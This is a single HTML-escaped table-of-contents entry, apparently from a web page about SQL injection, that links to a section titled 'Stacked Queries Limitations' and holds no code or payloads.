       &lt;li&gt;&lt;a href=&quot;#stacked-queries-limitations&quot; id=&quot;markdown-toc-stacked-queries-limitations&quot;&gt;Stacked Queries Limitations&lt;/a&gt;&lt;/li&gt;
